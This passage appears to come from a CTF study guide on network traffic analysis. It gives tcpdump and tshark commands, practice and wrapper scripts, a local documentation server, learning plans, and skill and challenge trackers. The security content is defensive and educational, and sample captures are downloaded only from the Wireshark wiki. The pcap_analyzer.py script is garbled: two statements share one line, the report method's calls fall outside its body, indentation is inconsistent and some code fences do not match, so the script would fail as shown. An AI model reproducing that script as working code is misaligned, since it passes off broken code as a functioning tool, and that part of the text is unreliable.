sudo tcpdump -i eth0 tcp

## Complex filters
sudo tcpdump -i eth0 'tcp port 80 and (src host 192.168.1.100 or dst host 192.168.1.100)'

## Save to file
sudo tcpdump -i eth0 -w capture.pcap
```

#### Reading Captures

```bash
## Basic read
tcpdump -r capture.pcap

## With ASCII
tcpdump -r capture.pcap -A

## With hex and ASCII
tcpdump -r capture.pcap -XX

## Verbose
tcpdump -r capture.pcap -vv
```

````

#### Interactive Tool Exploration

**Hands-On Learning Script**:
```bash
#!/bin/bash
## tool_practice.sh - Interactive tool learning

cat << 'EOF'
=== Network Traffic Analysis Tool Practice ===

This script will guide you through tool features using a sample pcap.

EOF

## Check for sample pcap
if [ ! -f "sample.pcap" ]; then
    echo "Downloading sample pcap..."
    wget -O sample.pcap https://wiki.wireshark.org/uploads/__moin_import__/attachments/SampleCaptures/http.cap
fi

echo "Using: sample.pcap"
echo ""

## Function to run command and explain
demo_command() {
    local tool="$1"
    local desc="$2"
    shift 2
    local cmd="$@"
    
    echo "=== $tool: $desc ==="
    echo "Command: $cmd"
    echo ""
    eval "$cmd"
    echo ""
    read -p "Press ENTER to continue..."
    echo ""
}

## tshark demos
demo_command "tshark" "Count total packets" \
    "tshark -r sample.pcap | wc -l"

demo_command "tshark" "Protocol hierarchy statistics" \
    "tshark -r sample.pcap -q -z io,phs"

demo_command "tshark" "Extract HTTP hosts" \
    "tshark -r sample.pcap -Y http.request -T fields -e http.host | sort -u"

demo_command "tshark" "Show conversations" \
    "tshark -r sample.pcap -q -z conv,tcp | head -20"

## Scapy demo
cat << 'EOF'
=== Scapy: Interactive packet analysis ===

Opening Scapy console. Try these commands:
  packets = rdpcap('sample.pcap')
  packets[0].show()
  packets.summary()
  
Type 'exit()' when done.
EOF
scapy

## Zeek demo
echo "=== Zeek: Generate protocol logs ==="
echo "Command: zeek -r sample.pcap"
zeek -r sample.pcap
echo ""
echo "Generated logs:"
ls -lh *.log
echo ""
echo "Sample conn.log entries:"
head -5 conn.log
echo ""
read -p "Press ENTER to continue..."

## Cleanup
echo "Practice session complete!"
echo "Generated files:"
ls -lh sample.pcap *.log 2>/dev/null
````

#### Building Custom Tool Wrappers

**Unified Interface Script**:

```python
#!/usr/bin/env python3
"""
pcap_analyzer.py - Unified interface for common analysis tasks
"""

import argparse
import subprocess
import sys
from pathlib import Path

class PcapAnalyzer:
    def __init__(self, pcap_file):
        self.pcap = pcap_file
        if not Path(pcap_file).exists():
            raise FileNotFoundError(f"File not found: {pcap_file}")
    
    def quick_stats(self):
        """Display basic capture statistics."""
        print("=== Quick Statistics ===\n")
        subprocess.run(['capinfos', self.pcap])
    
    def protocol_hierarchy(self):
        """Show protocol distribution."""
        print("\n=== Protocol Hierarchy ===\n")
        subprocess.run(['tshark', '-r', self.pcap, '-q', '-z', 'io,phs'])
    
    def extract_endpoints(self):
        """List all IP endpoints."""
        print("\n=== IP Endpoints ===\n")
        result = subprocess.run(
            ['tshark', '-r', self.pcap, '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst'],
            capture_output=True, text=True
        )
        ips = set()
        for line in result.stdout.split('\n'):
            ips.update(line.split())
        for ip in sorted(ips):
            print(ip)
    
    def extract_http_hosts(self):
        """List all HTTP hosts."""
        print("\n=== HTTP Hosts ===\n")
        subprocess.run([
            'tshark', '-r', self.pcap, '-Y', 'http.request',
            '-T', 'fields', '-e', 'http.host'
        ])
    
    def extract_dns_queries(self):
        """List all DNS queries."""
        print("\n=== DNS Queries ===\n")
        subprocess.run([
            'tshark', '-r', self.pcap, '-Y', 'dns.qry.name',
            '-T', 'fields', '-e', 'dns.qry.name'
        ])
    
    def export_http_objects(self, output_dir='http_objects'):
        """Extract HTTP transferred files."""
        Path(output_dir).mkdir(exist_ok=True)
        print(f"\n=== Exporting HTTP Objects to {output_dir}/ ===\n")
        subprocess.run([
            'tshark', '-r', self.pcap, '--export-objects', f'http,{output_dir}'
        ])
        print(f"\nExtracted files:")
        subprocess.run(['ls', '-lh', output_dir])
    
    def zeek_analysis(self, output_dir='zeek_logs'):
        """Run Zeek analysis."""
        Path(output_dir).mkdir(exist_ok=True)
        print(f"\n=== Running Zeek Analysis ===\n")
        subprocess.run(['zeek', '-r', self.pcap], cwd=output_dir)
        print(f"\nGenerated logs in {output_dir}/:")
        subprocess.run(['ls', '-lh'], cwd=output_dir)
    
    def full_report(self):
        """Generate comprehensive analysis report."""
        print("="*60)
        print(f"PCAP Analysis Report: {self.pcap}") print("="*60)

    self.quick_stats()
    self.protocol_hierarchy()
    self.extract_endpoints()
    self.extract_http_hosts()
    self.extract_dns_queries()


def main(): 
	parser = argparse.ArgumentParser( description='Unified PCAP analysis tool', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=''' Examples: %(prog)s -f capture.pcap --stats %(prog)s -f capture.pcap --full-report %(prog)s -f capture.pcap --extract-http %(prog)s -f capture.pcap --zeek ''' )
	
	parser.add_argument('-f', '--file', required=True, help='PCAP file to analyze')
	parser.add_argument('--stats', action='store_true', help='Show basic statistics')
	parser.add_argument('--protocols', action='store_true', help='Show protocol hierarchy')
	parser.add_argument('--endpoints', action='store_true', help='List IP endpoints')
	parser.add_argument('--http-hosts', action='store_true', help='List HTTP hosts')
	parser.add_argument('--dns-queries', action='store_true', help='List DNS queries')
	parser.add_argument('--extract-http', action='store_true', help='Extract HTTP objects')
	parser.add_argument('--zeek', action='store_true', help='Run Zeek analysis')
	parser.add_argument('--full-report', action='store_true', help='Generate full report')
	
	args = parser.parse_args()
	
	try:
	    analyzer = PcapAnalyzer(args.file)
	    
	    if args.full_report:
	        analyzer.full_report()
	    else:
	        if args.stats:
	            analyzer.quick_stats()
	        if args.protocols:
	            analyzer.protocol_hierarchy()
	        if args.endpoints:
	            analyzer.extract_endpoints()
	        if args.http_hosts:
	            analyzer.extract_http_hosts()
	        if args.dns_queries:
	            analyzer.extract_dns_queries()
	        if args.extract_http:
	            analyzer.export_http_objects()
	        if args.zeek:
	            analyzer.zeek_analysis()
	        
	        ## If no specific action, show help
	        if not any([args.stats, args.protocols, args.endpoints, 
	                   args.http_hosts, args.dns_queries, args.extract_http, 
	                   args.zeek]):
	            parser.print_help()
	
	except Exception as e:
	    print(f"Error: {e}", file=sys.stderr)
	    sys.exit(1)


if __name__ == '__main__': 
	main()
````

Usage:
```bash
chmod +x pcap_analyzer.py

## Quick analysis
./pcap_analyzer.py -f capture.pcap --stats

## Full report
./pcap_analyzer.py -f capture.pcap --full-report > report.txt

## Specific extractions
./pcap_analyzer.py -f capture.pcap --extract-http --zeek
````

#### Documentation Organization System

**Local Documentation Server**:

```python
#!/usr/bin/env python3
"""
doc_server.py - Local HTTP server for tool documentation
"""

import http.server
import socketserver
import webbrowser
from pathlib import Path

## Create documentation structure
DOCS_DIR = Path.home() / 'ctf_docs'
DOCS_DIR.mkdir(exist_ok=True)

## Create subdirectories
(DOCS_DIR / 'tools').mkdir(exist_ok=True)
(DOCS_DIR / 'writeups').mkdir(exist_ok=True)
(DOCS_DIR / 'cheatsheets').mkdir(exist_ok=True)
(DOCS_DIR / 'scripts').mkdir(exist_ok=True)

## Generate index.html
index_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>CTF Network Analysis Documentation</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        h1 { color: #333; border-bottom: 3px solid #007acc; padding-bottom: 10px; }
        .section { margin: 30px 0; }
        .section h2 { color: #007acc; }
        .links { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
        .card { background: #f9f9f9; padding: 20px; border-radius: 5px; border-left: 4px solid #007acc; }
        .card h3 { margin-top: 0; color: #333; }
        .card a { color: #007acc; text-decoration: none; }
        .card a:hover { text-decoration: underline; }
        code { background: #e8e8e8; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 CTF Network Traffic Analysis Documentation</h1>
        
        <div class="section">
            <h2>Quick Reference</h2>
            <div class="links">
                <div class="card">
                    <h3>Wireshark</h3>
                    <p><a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank">User Guide</a></p>
                    <p><a href="https://www.wireshark.org/docs/dfref/" target="_blank">Display Filter Reference</a></p>
                    <p><a href="cheatsheets/wireshark.html">Local Cheatsheet</a></p>
                </div>
                
                <div class="card">
                    <h3>tshark</h3>
                    <p><a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank">Man Page</a></p>
                    <p><a href="cheatsheets/tshark.html">Command Examples</a></p>
                </div>
                
                <div class="card">
                    <h3>Scapy</h3>
                    <p><a href="https://scapy.readthedocs.io/" target="_blank">Official Docs</a></p>
                    <p><a href="cheatsheets/scapy.html">Code Snippets</a></p>
                </div>
                
                <div class="card">
                    <h3>Zeek</h3>
                    <p><a href="https://docs.zeek.org/" target="_blank">Documentation</a></p>
                    <p><a href="cheatsheets/zeek.html">Script Examples</a></p>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>📚 Write-ups Collection</h2>
            <div class="links">
                <div class="card">
                    <h3>By Technique</h3>
                    <p><a href="writeups/by_technique.html">Browse by Analysis Technique</a></p>
                </div>
                <div class="card">
                    <h3>By Event</h3>
                    <p><a href="writeups/by_event.html">Browse by CTF Event</a></p>
                </div>
                <div class="card">
                    <h3>By Difficulty</h3>
                    <p><a href="writeups/by_difficulty.html">Browse by Challenge Difficulty</a></p>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>🛠️ Custom Scripts</h2>
            <p>View and download your custom analysis scripts:</p>
            <p><a href="scripts/">Script Directory</a></p>
        </div>
        
        <div class="section">
            <h2>🎯 Quick Commands</h2>
            <div class="card">
                <p><code>tshark -r file.pcap -q -z io,phs</code> - Protocol hierarchy</p>
                <p><code>tshark -r file.pcap -Y "http" -T fields -e http.host</code> - Extract HTTP hosts</p>
                <p><code>zeek -r file.pcap</code> - Generate Zeek logs</p>
                <p><code>scapy</code> - Open interactive Scapy shell</p>
            </div>
        </div>
    </div>
</body>
</html>
'''

(DOCS_DIR / 'index.html').write_text(index_html)

## Start server
PORT = 8080
Handler = http.server.SimpleHTTPRequestHandler

print(f"Starting documentation server at http://localhost:{PORT}")
print(f"Documentation directory: {DOCS_DIR}")
print("\nPress Ctrl+C to stop")

## Open browser
webbrowser.open(f'http://localhost:{PORT}')

## Serve from docs directory
import os
os.chdir(DOCS_DIR)

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
```

## Continuous Learning Strategies

### Structured Learning Path

**Progressive Skill Development**:

```
Level 1: Foundation (Weeks 1-4)
├── Basic packet structure understanding
├── Wireshark GUI proficiency
├── Common protocol analysis (HTTP, DNS, TCP)
└── Simple filter creation

Level 2: Intermediate (Weeks 5-12)
├── tshark automation
├── Scapy scripting
├── Protocol anomaly detection
├── File carving from traffic
└── Basic encryption recognition

Level 3: Advanced (Weeks 13-24)
├── Custom protocol reverse engineering
├── Zeek scripting
├── Traffic correlation analysis
├── Covert channel detection
└── Automated analysis pipeline creation

Level 4: Expert (Ongoing)
├── Novel protocol discovery
├── Advanced statistical analysis
├── Machine learning integration
├── Tool development
└── Contribution to community
```

**Weekly Learning Schedule**:

```markdown
# Weekly CTF Network Analysis Practice

## Monday: Theory & Reading
- [ ] Read 2-3 CTF write-ups (30-45 min)
- [ ] Study one protocol RFC or documentation (30 min)
- [ ] Update personal knowledge base

## Tuesday: Tool Mastery
- [ ] Learn one new tshark/Wireshark feature (20 min)
- [ ] Practice with sample captures (40 min)
- [ ] Document new commands in cheatsheet

## Wednesday: Hands-On Practice
- [ ] Solve 1-2 old CTF challenges (60 min)
- [ ] Attempt to reproduce techniques from write-ups
- [ ] Create own write-up for practice

## Thursday: Scripting & Automation
- [ ] Write/improve analysis script (45 min)
- [ ] Test script on multiple captures (15 min)
- [ ] Commit to personal toolkit repository

## Friday: Active CTF Participation
- [ ] Join live CTF if available (2-4 hours)
- [ ] OR work on CTF challenges from CTFtime

## Weekend: Deep Dive
- [ ] Choose one complex topic to study deeply
- [ ] Build proof-of-concept or test scenario
- [ ] Write blog post or detailed notes
```

### Practice Platforms

**CTF Platforms with Network Challenges**:

1. **PicoCTF** (https://picoctf.org)
    
    - Beginner-friendly
    - Permanent challenges available
    - Educational focus
2. **HackTheBox** (https://hackthebox.com)
    
    - "Challenges" section has network analysis
    - Retired machines available with VIP
3. **Root-Me** (https://www.root-me.org)
    
    - "Network" category challenges
    - Progressive difficulty
4. **CyberDefenders** (https://cyberdefenders.org)
    
    - Blue team focus
    - Full pcap analysis challenges
    - Real-world scenarios

**Challenge Collection Script**:

```bash
#!/bin/bash
# collect_practice_pcaps.sh - Gather practice materials

PRACTICE_DIR="$HOME/ctf_practice/pcaps"
mkdir -p "$PRACTICE_DIR"

echo "=== Collecting Practice PCAPs ==="

# Wireshark sample captures
echo "[+] Downloading Wireshark samples..."
cd "$PRACTICE_DIR"
wget -q https://wiki.wireshark.org/uploads/__moin_import__/attachments/SampleCaptures/http.cap
wget -q https://wiki.wireshark.org/uploads/__moin_import__/attachments/SampleCaptures/dns.cap
wget -q https://wiki.wireshark.org/uploads/__moin_import__/attachments/SampleCaptures/ftp.pcap

# Malware traffic analysis
echo "[+] Checking malware-traffic-analysis.net..."
echo "Visit: https://malware-traffic-analysis.net/training-exercises.html"
echo "Download traffic exercises for practice"

# Create practice checklist
cat > "$PRACTICE_DIR/PRACTICE_CHECKLIST.md" << 'EOF'
# Practice PCAP Checklist

## Basic Analysis Practice
- [ ] http.cap - HTTP traffic analysis
- [ ] dns.cap - DNS query analysis
- [ ] ftp.pcap - FTP credential extraction

## Intermediate Challenges
- [ ] Malware traffic analysis exercises
- [ ] Old CTF challenges from CTFtime

## Advanced Practice
- [ ] Create own challenges
- [ ] Reverse engineer unknown protocols
- [ ] Build automated analysis tools

## Skill Assessment
Track time to complete each challenge:
- First attempt: _____ minutes
- After learning: _____ minutes
- Target: < 10 minutes for basics
EOF

echo ""
echo "Practice materials in: $PRACTICE_DIR"
echo "Review PRACTICE_CHECKLIST.md for guidance"
```

### Skill Assessment Framework

**Self-Evaluation Rubric**:

```python
#!/usr/bin/env python3
"""
skill_assessment.py - Track your CTF network analysis skills
"""

import json
from datetime import datetime
from pathlib import Path

SKILLS_FILE = Path.home() / 'ctf_skills.json'

SKILL_CATEGORIES = {
    'Basic Analysis': [
        'Open and navigate pcap in Wireshark',
        'Apply display filters',
        'Follow TCP/UDP streams',
        'Extract HTTP objects',
        'Identify common protocols',
    ],
    'Tool Proficiency': [
        'Use tshark for automation',
        'Write Scapy scripts',
        'Run Zeek analysis',
        'Use NetworkMiner effectively',
        'Create custom Wireshark dissectors',
    ],
    'Protocol Knowledge': [
        'Understand TCP/IP fundamentals',
        'Analyze HTTP/HTTPS traffic',
        'Interpret DNS queries and responses',
        'Recognize email protocols (SMTP/POP/IMAP)',
        'Identify VPN/tunneling protocols',
    ],
    'Advanced Techniques': [
        'Detect data exfiltration',
        'Identify covert channels',
        'Reverse engineer unknown protocols',
        'Analyze encrypted traffic metadata',
        'Perform statistical traffic analysis',
    ],
    'Automation': [
        'Write analysis scripts',
        'Build custom tools',
        'Create automated pipelines',
        'Integrate multiple tools',
        'Generate reports programmatically',
    ]
}

def load_skills():
    """Load skill tracking data."""
    if SKILLS_FILE.exists():
        with open(SKILLS_FILE, 'r') as f:
            return json.load(f)
    return {'skills': {}, 'assessments': []}

def save_skills(data):
    """Save skill tracking data."""
    with open(SKILLS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def assess_skills():
    """Interactive skill assessment."""
    data = load_skills()
    
    print("=== CTF Network Analysis Skill Assessment ===\n")
    print("Rate each skill: 0=No knowledge, 1=Basic, 2=Intermediate, 3=Advanced, 4=Expert\n")
    
    assessment = {
        'date': datetime.now().isoformat(),
        'ratings': {}
    }
    
    for category, skills in SKILL_CATEGORIES.items():
        print(f"\n{category}:")
        print("-" * 50)
        
        category_ratings = {}
        for skill in skills:
            while True:
                try:
                    rating = int(input(f"  {skill}: "))
                    if 0 <= rating <= 4:
                        category_ratings[skill] = rating
                        break
                    else:
                        print("    Please enter 0-4")
                except ValueError:
                    print("    Please enter a number")
        
        assessment['ratings'][category] = category_ratings
    
    # Calculate category averages
    print("\n" + "="*50)
    print("Assessment Summary:")
    print("="*50)
    
    total_score = 0
    total_skills = 0
    
    for category, ratings in assessment['ratings'].items():
        avg = sum(ratings.values()) / len(ratings)
        total_score += sum(ratings.values())
        total_skills += len(ratings)
        print(f"{category}: {avg:.2f}/4.0")
    
    overall = total_score / total_skills
    print(f"\nOverall Score: {overall:.2f}/4.0")
    
    # Provide recommendations
    print("\n" + "="*50)
    print("Recommendations:")
    print("="*50)
    
    weak_areas = []
    for category, ratings in assessment['ratings'].items():
        for skill, rating in ratings.items():
            if rating < 2:
                weak_areas.append((skill, category, rating))
    
    weak_areas.sort(key=lambda x: x[2])
    
    if weak_areas:
        print("\nPriority areas to improve:")
        for skill, category, rating in weak_areas[:5]:
            print(f"  - {skill} ({category})")
    else:
        print("\nExcellent! All skills at intermediate level or above.")
    
    # Save assessment
    data['assessments'].append(assessment)
    data['skills'] = assessment['ratings']
    save_skills(data)
    
    print(f"\nAssessment saved to: {SKILLS_FILE}")

def show_progress():
    """Display skill progress over time."""
    data = load_skills()
    
    if len(data['assessments']) < 2:
        print("Need at least 2 assessments to show progress")
        return
    
    print("=== Skill Progress ===\n")
    
    first = data['assessments'][0]
    latest = data['assessments'][-1]
    
    print(f"First assessment: {first['date'][:10]}")
    print(f"Latest assessment: {latest['date'][:10]}")
    print()
    
    for category in SKILL_CATEGORIES:
        first_ratings = first['ratings'].get(category, {})
        latest_ratings = latest['ratings'].get(category, {})
        
        first_avg = sum(first_ratings.values()) / len(first_ratings) if first_ratings else 0
        latest_avg = sum(latest_ratings.values()) / len(latest_ratings) if latest_ratings else 0
        
        improvement = latest_avg - first_avg
        arrow = "📈" if improvement > 0 else "📊" if improvement == 0 else "📉"
        
        print(f"{category}: {first_avg:.2f} → {latest_avg:.2f} {arrow} ({improvement:+.2f})")

def main():
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'progress':
        show_progress()
    else:
        assess_skills()

if __name__ == '__main__':
    main()
```

Usage:

```bash
# Take skill assessment
python3 skill_assessment.py

# View progress over time
python3 skill_assessment.py progress
```

### Building a Learning Community

**Collaboration Strategies**:

1. **Study Groups**:

```markdown
# Virtual Study Group Format

## Weekly Meeting Structure (90 minutes)

### Part 1: Challenge Review (30 min)
- Each member presents one solved challenge
- Explain approach and techniques used
- Discuss alternative solutions

### Part 2: Live Problem Solving (45 min)
- Select unsolved challenge
- Collaborate on solution
- Share screens and tools
- Document process

### Part 3: Learning Share (15 min)
- Share new tools discovered
- Discuss upcoming CTFs
- Plan next meeting's focus
```

2. **Discord/Slack Channels**:

```
Recommended channel structure:
#general - Announcements and discussion
#challenges - Challenge-specific help
#writeups - Share and discuss write-ups
#tools - Tool tips and scripts
#resources - Useful links and materials
#live-ctf - Real-time competition collaboration
```

3. **Blog/Write-up Publishing**:

```bash
#!/bin/bash
# publish_writeup.sh - Automate write-up publishing

WRITEUP="$1"
BLOG_DIR="$HOME/ctf-blog"

if [ ! -f "$WRITEUP" ]; then
    echo "Usage: $0 <writeup.md>"
    exit 1
fi

# Convert markdown to HTML with syntax highlighting
pandoc "$WRITEUP" \
    --standalone \
    --highlight-style=tango \
    --css=style.css \
    -o "$BLOG_DIR/$(basename "$WRITEUP" .md).html"

# Generate index
cd "$BLOG_DIR"
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>CTF Write-ups</title></head>
<body>
<h1>My CTF Write-ups</h1>
<ul>
EOF

for html in *.html; do
    if [ "$html" != "index.html" ]; then
        echo "<li><a href='$html'>$(basename "$html" .html)</a></li>" >> index.html
    fi
done

echo "</ul></body></html>" >> index.html

# Commit and push
git add .
git commit -m "Add write-up: $(basename "$WRITEUP" .md)"
git push

echo "Write-up published to GitHub Pages"
```

### Tracking Progress and Metrics

**Performance Tracking System**:

```python
#!/usr/bin/env python3
"""
ctf_tracker.py - Track CTF challenge performance
"""

import json
from datetime import datetime
from pathlib import Path
import matplotlib.pyplot as plt

TRACKER_FILE = Path.home() / 'ctf_tracker.json'

def load_data():
    if TRACKER_FILE.exists():
        with open(TRACKER_FILE, 'r') as f:
            return json.load(f)
    return {'challenges': [], 'events': []}

def save_data(data):
    with open(TRACKER_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def log_challenge(data):
    """Log a completed challenge."""
    print("\n=== Log Challenge ===\n")
    
    challenge = {}
    challenge['date'] = datetime.now().isoformat()
    challenge['event'] = input("CTF Event: ")
    challenge['name'] = input("Challenge Name: ")
    challenge['category'] = 'network'
    challenge['points'] = int(input("Points: "))
    challenge['difficulty'] = input("Difficulty (easy/medium/hard): ")
    challenge['time_spent'] = int(input("Time spent (minutes): "))
    challenge['solved'] = input("Solved? (y/n): ").lower() == 'y'
    
    if challenge['solved']:
        challenge['techniques'] = input("Techniques used (comma-separated): ").split(',')
        challenge['techniques'] = [t.strip() for t in challenge['techniques']]
        challenge['tools'] = input("Tools used (comma-separated): ").split(',')
        challenge['tools'] = [t.strip() for t in challenge['tools']]
    
    challenge['notes'] = input("Notes: ")
    
    data['challenges'].append(challenge)
    save_data(data)
    
    print("\n✓ Challenge logged!")

def show_stats(data):
    """Display statistics."""
    challenges = data['challenges']
    
    if not challenges:
        print("No challenges logged yet")
        return
    
    total = len(challenges)
    solved = sum(1 for c in challenges if c['solved'])
    total_points = sum(c['points'] for c in challenges if c['solved'])
    avg_time = sum(c['time_spent'] for c in challenges) / total
    
    print("\n=== Statistics ===")
    print(f"Total challenges attempted: {total}")
    print(f"Solved: {solved} ({solved/total*100:.1f}%)")
    print(f"Total points: {total_points}")
    print(f"Average time per challenge: {avg_time:.1f} minutes")
    
    # By difficulty
    print("\nBy difficulty:")
    for diff in ['easy', 'medium', 'hard']:
        diff_challenges = [c for c in challenges if c.get('difficulty') == diff]
        if diff_challenges:
            diff_solved = sum(1 for c in diff_challenges if c['solved'])
            print(f"  {diff.capitalize()}: {diff_solved}/{len(diff_challenges)} solved")
    
    # Most used tools
    tools = {}
    for c in challenges:
        if c['solved']:
            for tool in c.get('tools', []):
                tools[tool] = tools.get(tool, 0) + 1
    
    if tools:
        print("\nMost used tools:")
        for tool, count in sorted(tools.items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  {tool}: {count} times")
    
    # Most used techniques
    techniques = {}
    for c in challenges:
        if c['solved']:
            for tech in c.get('techniques', []):
                techniques[tech] = techniques.get(tech, 0) + 1
    
    if techniques:
        print("\nMost used techniques:")
        for tech, count in sorted(techniques.items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  {tech}: {count} times")

def plot_progress(data):
    """Generate progress visualization."""
    challenges = sorted(data['challenges'], key=lambda x: x['date'])
    
    if len(challenges) < 2:
        print("Need more data for visualization")
        return
    
    dates = [datetime.fromisoformat(c['date']) for c in challenges]
    cumulative_solves = []
    cumulative_points = []
    
    solves = 0
    points = 0
    
    for c in challenges:
        if c['solved']:
            solves += 1
            points += c['points']
        cumulative_solves.append(solves)
        cumulative_points.append(points)
    
    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(10, 8))
    
    ax1.plot(dates, cumulative_solves, marker='o')
    ax1.set_title('Cumulative Challenges Solved')
    ax1.set_xlabel('Date')
    ax1.set_ylabel('Challenges Solved')
    ax1.grid(True, alpha=0.3)
    
    ax2.plot(dates, cumulative_points, marker='o', color='green')
    ax2.set_title('Cumulative Points Earned')
    ax2.set_xlabel('Date')
    ax2.set_ylabel('Points')
    ax2.grid(True, alpha=0.3)
    
    plt.tight_layout()
    plt.savefig('ctf_progress.png')
    print("Progress chart saved to: ctf_progress.png")

def main():
    import sys
    
    data = load_data()
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        if command == 'log':
            log_challenge(data)
        elif command == 'stats':
            show_stats(data)
        elif command == 'plot':
            plot_progress(data)
        else:
            print(f"Unknown command: {command}")
    else:
        print("Usage: ctf_tracker.py [log|stats|plot]")

if __name__ == '__main__':
    main()
```

Usage:

```bash
# Log a challenge
python3 ctf_tracker.py log

# View statistics
python3 ctf_tracker.py stats

# Generate progress chart
python3 ctf_tracker.py plot
```

### Recommended Learning Resources

**Books**:

- _Practical Packet Analysis_ by Chris Sanders (3rd Edition)
- _Network Forensics_ by Sherri Davidoff & Jonathan Ham
- _The Practice of Network Security Monitoring_ by Richard Bejtlich

**Online Courses**: [Inference] These platforms offer network security content:

- Cybrary: Network Traffic Analysis courses
- SANS SEC503: Intrusion Detection In-Depth
- Wireshark University: Various certification paths

**Video Channels**:

- Wireshark Foundation YouTube channel
- Chris Greer (Wireshark training)
- NetworkChuck (networking fundamentals)

**Podcasts**:

- Darknet Diaries (real-world network incidents)
- Risky Business (security news)
- Hacking Humans (social engineering, often involves network indicators)

### Continuous Improvement Checklist

**Monthly Review Template**:

```markdown
# Monthly CTF Network Analysis Review

Date: _______________

## Challenges Completed
- Total attempted: _____
- Successfully solved: _____
- Solve rate: _____%

## New Skills Acquired
- [ ] Tool: _________________
- [ ] Technique: _________________
- [ ] Protocol knowledge: _________________

## Best Solution
Challenge: _________________
Why it was good: _________________

## Biggest Challenge
Challenge: _________________
Why it was difficult: _________________
How I eventually solved it: _________________

## Time Management
Average time per challenge: _____ minutes
Fastest solve: _____ minutes
Areas taking too long: _________________

## Tool Usage
Most used tool: _________________
Tool I should use more: _________________
New tool discovered: _________________

## Next Month's Goals
1. _________________
2. _________________
3. _________________

## Resources to Review
- [ ] Write-up: _________________
- [ ] Documentation: _________________
- [ ] Course/Tutorial: _________________
```

### Long-Term Mastery Path

**Advanced Topics to Explore**:

```
Year 1: Foundations + Practice
- Master basic tools and protocols
- Complete 50+ challenges
- Write 10+ detailed write-ups

Year 2: Specialization
- Choose 2-3 specialized areas (e.g., malware analysis, ICS protocols, wireless)
- Contribute to open-source tools
- Compete in 10+ CTFs

Year 3: Expertise
- Develop custom analysis frameworks
- Mentor beginners
- Create original challenges
- Present at conferences

Year 4+: Innovation
- Research novel techniques
- Publish papers/tools
- Teach workshops
- Build CTF events
```

## Related Topics for Deeper Study

- **Machine Learning for Traffic Analysis**: Anomaly detection and classification
- **ICS/SCADA Protocol Analysis**: Specialized industrial protocols (Modbus, DNP3, S7)
- **Wireless Protocol Analysis**: 802.11, Bluetooth, Zigbee capture and analysis
- **Malware Traffic Analysis**: Identifying and analyzing malicious network behavior
- **Large-Scale Traffic Forensics**: Tools and techniques for multi-gigabyte captures

---